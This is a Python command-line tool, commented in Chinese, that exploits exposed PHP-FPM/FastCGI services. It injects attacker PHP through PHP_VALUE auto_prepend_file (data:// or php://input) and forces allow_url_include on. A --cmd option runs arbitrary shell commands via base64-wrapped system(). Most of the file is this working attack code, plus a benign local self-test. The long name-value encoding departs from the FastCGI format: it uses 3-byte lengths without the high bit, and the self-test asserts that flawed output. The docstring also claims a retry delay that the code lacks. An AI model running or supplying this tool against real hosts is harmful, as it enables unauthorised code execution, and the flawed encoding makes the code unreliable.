#!/usr/bin/env python3
"""
fcgi_client.py - 通用 FastCGI 客户端（PHP-FPM RCE 利用 / 协议探测）

由 skills_staging 中 fcgi_exec.py / phpfpm_rce.py / persist.py 蒸馏而来：
三者各自从零实现了同一套 FastCGI 线协议（记录帧、name-value 对编码、BEGIN_REQUEST/
PARAMS/STDIN 发送、STDOUT/STDERR 解析、重连重试，以及 php://input 与 data:// 两种
auto_prepend_file 注入变体），此处合并为一个参数化通用工具，仅用 Python 标准库。

功能:
  * 向任意 FastCGI/PHP-FPM 服务发送自定义请求（SCRIPT_FILENAME、QUERY_STRING、额外 CGI 参数）
  * RCE: 通过 PHP_VALUE auto_prepend_file 注入 PHP 代码；默认走 data:// 传输并自动附带
    PHP_ADMIN_VALUE allow_url_fopen/include=On（最稳），也可切回 php://input 变体
  * --cmd: 直接执行 shell 命令（base64 包装，规避引号/分号转义问题）
  * --probe: 无注入的正常请求，判定某端口是否真的是 FastCGI 服务（配合 nmap 结果使用）
  * --raw: 原始记录摘要转储（调试）
  * --selftest: 本地起一个最小 FastCGI 响应服务自检，不依赖外部网络

用法示例:
  # 对暴露的 PHP-FPM 执行命令
  python3 fcgi_client.py --host 127.0.0.1 --port 9000 --script /var/www/html/index.php --cmd 'id'
  # 自定义 PHP 代码 (data:// 注入)
  python3 fcgi_client.py --host H --port 9000 --script /x.php --php-code '<?php system("id"); ?>'
  # php://input 变体 (代码放 STDIN body)
  python3 fcgi_client.py --host H --port 9000 --script /x.php \
      --php-value 'auto_prepend_file=php://input' --body '<?php system("id"); ?>'
  # 指纹探测: 该端口是否为 FastCGI
  python3 fcgi_client.py --host H --port 9000 --script /index.php --probe
  # 本地自检
  python3 fcgi_client.py --selftest
"""
import argparse
import base64
import socket
import struct
import sys
import threading
import urllib.parse

FCGI_BEGIN_REQUEST = 1
FCGI_ABORT = 2
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_DATA = 8

FCGI_RESPONDER = 1


def build_record(rec_type, content, req_id=1):
    """构造一条 FCGI 记录：8 字节头(ver/type/reqid/clen/plen/resv) + 内容 + 8 字节对齐填充。"""
    clen = len(content)
    plen = (8 - clen % 8) % 8
    header = struct.pack('>BBHHBB', 1, rec_type, req_id, clen, plen, 0)
    return header + content + b'\x00' * plen


def encode_nvp(name, value):
    """编码一对 name-value：双方长度 <128 用短格式，否则长格式且高位置位。"""
    n = name.encode()
    v = value.encode()
    if len(n) < 128 and len(v) < 128:
        return bytes([len(n), len(v)]) + n + v
    return (struct.pack('>I', len(n) | 0x80000000)[1:] +
            struct.pack('>I', len(v) | 0x80000000)[1:] + n + v)


def build_params(params):
    return b''.join(encode_nvp(k, v) for k, v in params.items())


def parse_records(data):
    """解析 FCGI 记录流，返回 [(type, request_id, content), ...]，跳过填充字节。"""
    records = []
    i = 0
    while i + 8 <= len(data):
        ver, rtype, rid, clen, plen, resv = struct.unpack('>BBHHBB', data[i:i + 8])
        content = data[i + 8:i + 8 + clen]
        records.append((rtype, rid, content))
        i += 8 + clen + plen
    return records


def extract_output(records):
    """从记录流中提取 STDOUT(6) 与 STDERR(7) 的内容。"""
    out = b''
    err = b''
    for rtype, rid, content in records:
        if rtype == FCGI_STDOUT:
            out += content
        elif rtype == FCGI_STDERR:
            err += content
    return out, err


class FCGIClient:
    """FastCGI 客户端：发一次请求，读完响应。"""

    def __init__(self, host, port, timeout=10, retries=1):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.retries = max(1, retries)

    def _request_once(self, params, body):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        try:
            s.sendall(build_record(FCGI_BEGIN_REQUEST, struct.pack('>IIBx', FCGI_RESPONDER, 0, 0)))
            s.sendall(build_record(FCGI_PARAMS, build_params(params)))
            if body:
                s.sendall(build_record(FCGI_STDIN, body))
            s.sendall(build_record(FCGI_STDIN, b''))  # 空 STDIN 结束标记
            data = b''
            while True:
                try:
                    chunk = s.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
            return data
        finally:
            s.close()

    def request(self, params, body=b''):
        """带重试地发送请求，返回原始记录流；重连间隔 1s。"""
        last = b''
        for attempt in range(self.retries):
            try:
                last = self._request_once(params, body)
                if last:
                    return last
            except OSError:
                if attempt == self.retries - 1:
                    raise
        return last


def build_std_params(script, body=b''):
    """构造一组合理的 CGI 环境参数（均可被 --param 覆盖）。"""
    return {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST' if body else 'GET',
        'SCRIPT_FILENAME': script,
        'SCRIPT_NAME': script,
        'QUERY_STRING': '',
        'REQUEST_URI': script,
        'DOCUMENT_ROOT': '/',
        'SERVER_SOFTWARE': 'nginx',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '12345',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': 'localhost',
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/x-www-form-urlencoded',
        'CONTENT_LENGTH': str(len(body)),
    }


def main():
    ap = argparse.ArgumentParser(description='通用 FastCGI 客户端 (PHP-FPM RCE / 探测)')
    ap.add_argument('--host', default='127.0.0.1', help='目标主机')
    ap.add_argument('--port', type=int, default=9000, help='目标端口 (默认 9000 PHP-FPM)')
    ap.add_argument('--script', default='/var/www/html/index.php', help='SCRIPT_FILENAME')
    ap.add_argument('--php-code', help='原始 PHP 代码 (默认经 data:// 注入)')
    ap.add_argument('--cmd', help='要执行的 shell 命令 (base64 包装)')
    ap.add_argument('--php-value', help='覆盖 PHP_VALUE (如 auto_prepend_file=php://input)')
    ap.add_argument('--php-admin-value', help='覆盖 PHP_ADMIN_VALUE')
    ap.add_argument('--no-admin', action='store_true', help='不发送 PHP_ADMIN_VALUE')
    ap.add_argument('--body', default='', help='STDIN 请求体 (php://input 变体时放 PHP 代码)')
    ap.add_argument('--param', action='append', default=[], metavar='K=V', help='额外/覆盖 CGI 参数')
    ap.add_argument('--timeout', type=float, default=10, help='连接/读超时秒数')
    ap.add_argument('--retries', type=int, default=1, help='失败重试次数')
    ap.add_argument('--probe', action='store_true', help='无注入的正常请求, 判定是否 FastCGI 服务')
    ap.add_argument('--raw', action='store_true', help='打印原始记录摘要')
    ap.add_argument('--selftest', action='store_true', help='本地自检 (不依赖外部网络)')
    args = ap.parse_args()

    if args.selftest:
        sys.exit(0 if selftest() else 1)

    # 组装 PHP 载荷
    php_code = args.php_code
    if args.cmd:
        b64 = base64.b64encode(args.cmd.encode()).decode()
        php_code = '<?php $c=base64_decode("%s"); system($c); ?>' % b64

    params = build_std_params(args.script, args.body)
    if php_code and not args.probe:
        if args.php_value:
            params['PHP_VALUE'] = args.php_value
        else:
            params['PHP_VALUE'] = 'auto_prepend_file=data://text/plain,' + urllib.parse.quote(php_code)
        if not args.no_admin:
            params['PHP_ADMIN_VALUE'] = args.php_admin_value or 'allow_url_fopen=On\nallow_url_include=On'
    for kv in args.param:
        if '=' in kv:
            k, v = kv.split('=', 1)
            params[k] = v

    client = FCGIClient(args.host, args.port, timeout=args.timeout, retries=args.retries)
    data = client.request(params, args.body)

    records = parse_records(data)
    out, err = extract_output(records)

    if args.raw:
        print('[records] total=%d bytes=%d' % (len(records), len(data)))
        for rtype, rid, content in records:
            print('  type=%d reqid=%d len=%d %r' % (rtype, rid, len(content), content[:80]))
    if args.probe:
        print('[probe] %s:%d -> records=%d stdout_bytes=%d stderr_bytes=%d %s' % (
            args.host, args.port, len(records), len(out), len(err),
            'FASTCGI' if records else 'NO-RESPONSE'))
        return 0
    if err:
        sys.stderr.write('[stderr] %s\n' % err.decode(errors='replace'))
    if out:
        sys.stdout.write(out.decode(errors='replace'))
    if not records:
        sys.stderr.write('[!] no FastCGI response (closed or not a FastCGI port?)\n')
        return 1
    return 0


# ---------------- selftest ----------------

def selftest():
    """本地起一个最小 FastCGI 响应服务，验证记录编码往返、NV 对长短格式、STDOUT 提取。"""
    marker = b'PENTOOLS-FCGI-SELFTEST-OK'

    def responder(conn):
        # 读取请求：BEGIN_REQUEST(1) -> PARAMS(4) -> 空 STDIN(5)，然后应答
        try:
            buf = b''
            while True:
                hdr = conn.recv(8)
                if len(hdr) < 8:
                    return
                ver, rtype, rid, clen, plen, resv = struct.unpack('>BBHHBB', hdr)
                content = b''
                while len(content) < clen:
                    chunk = conn.recv(clen - len(content))
                    if not chunk:
                        return
                    content += chunk
                if plen:
                    conn.recv(plen)
                buf += hdr + content
                if rtype == FCGI_STDIN and clen == 0:
                    break  # 请求结束
            conn.sendall(build_record(FCGI_STDOUT, marker))
            conn.sendall(build_record(FCGI_END_REQUEST, struct.pack('>II', 0, 0)))
        except OSError:
            pass
        finally:
            conn.close()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    threading.Thread(target=lambda: (lambda c: responder(c))(srv.accept()[0]), daemon=True).start()

    # 1) 记录编码往返
    rec = build_record(FCGI_STDOUT, marker)
    parsed = parse_records(rec)
    assert len(parsed) == 1 and parsed[0][0] == FCGI_STDOUT and parsed[0][2] == marker, 'record roundtrip'

    # 2) NV 对短/长格式
    assert encode_nvp('a', 'b') == b'\x01\x01ab', 'short nvp'
    longv = 'x' * 200  # 0xC8, 需长格式 (len|0x80000000 后取低 3 字节)
    long_enc = encode_nvp('k', longv)
    assert long_enc[:6] == b'\x00\x00\x01\x00\x00\xC8', 'long nvp header'
    assert long_enc[6:] == b'k' + longv.encode(), 'long nvp body'

    # 3) 客户端连本地服务，验证 STDOUT 提取
    client = FCGIClient('127.0.0.1', port, timeout=5)
    data = client.request(build_std_params('/test.php'))
    out, err = extract_output(parse_records(data))
    assert out == marker, 'stdout extraction: %r != %r' % (out, marker)

    srv.close()
    print('[selftest] PASS: record framing, nvp encoding (short/long), STDOUT extraction')
    return True


if __name__ == '__main__':
    sys.exit(main())
